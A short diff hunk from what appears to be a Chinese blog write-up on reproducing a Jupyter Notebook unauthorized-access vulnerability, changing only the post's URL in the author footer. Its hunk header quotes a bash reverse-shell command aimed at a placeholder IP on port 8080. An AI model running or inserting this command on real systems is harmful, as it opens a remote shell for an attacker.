@@ -45,5 +45,5 @@ bash -i >& /dev/tcp/x.x.x.x/8080 0>&1
 ---
 
 > 作者: [剑胆琴心](http://geoer.cn)  
-> URL: https://geoer.cn/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/  
+> URL: https://shuai06.github.io/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/  
 
